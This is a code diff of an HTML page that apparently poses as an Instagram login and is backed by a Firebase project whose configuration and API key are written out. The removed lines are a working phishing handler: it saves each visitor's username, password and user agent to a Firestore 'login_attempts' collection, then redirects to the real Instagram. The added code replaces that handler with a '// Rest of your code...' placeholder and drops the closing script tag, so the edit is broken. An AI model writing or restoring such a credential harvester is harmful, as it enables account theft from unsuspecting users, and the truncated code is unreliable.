@@ -87,46 +87,25 @@
     </div>
 
     <script>
-        // Firebase configuration
-        const firebaseConfig = {
-            apiKey: "AIzaSyBFLWTZnHz8EcLjsdHAXDXG5ogU7z0ok0I",
-            authDomain: "insta-7f34f.firebaseapp.com",
-            databaseURL: "https://insta-7f34f-default-rtdb.firebaseio.com",
-            projectId: "insta-7f34f",
-            storageBucket: "insta-7f34f.firebasestorage.app",
-            messagingSenderId: "981637167144",
-            appId: "1:981637167144:web:841af72e833be6ed081d1d"
-        };
-      
-        // Initialize Firebase
+    // Firebase configuration
+    const firebaseConfig = {
+        apiKey: "AIzaSyBFLWTZnHz8EcLjsdHAXDXG5ogU7z0ok0I",
+        authDomain: "insta-7f34f.firebaseapp.com",
+        projectId: "insta-7f34f",
+        storageBucket: "insta-7f34f.firebasestorage.app",
+        messagingSenderId: "981637167144",
+        appId: "1:981637167144:web:841af72e833be6ed081d1d"
+    };
+
+    // Initialize Firebase
+    try {
         const app = firebase.initializeApp(firebaseConfig);
         const db = firebase.firestore();
+        console.log("Firebase initialized successfully");
+    } catch (error) {
+        console.error("Firebase initialization error:", error);
+    }
 
-        // Handle form submission
-        document.getElementById('loginForm').addEventListener('submit', async function(event) {
-            event.preventDefault();
-            
-            const username = document.getElementById('username').value;
-            const password = document.getElementById('password').value;
-            
-            try {
-                // Store in Firebase
-                await db.collection("login_attempts").add({
-                    username: username,
-                    password: password,
-                    timestamp: firebase.firestore.FieldValue.serverTimestamp(),
-                    userAgent: navigator.userAgent,
-                    timestampClient: new Date().toISOString()
-                });
-                
-                // Redirect to Instagram after successful storage
-                window.location.href = "https://www.instagram.com/";
-            } catch (error) {
-                console.error("Error storing data: ", error);
-                // Still redirect even if storage fails
-                window.location.href = "https://www.instagram.com/";
-            }
-        });
-    </script>
+    // Rest of your code...
 </body>
 </html>
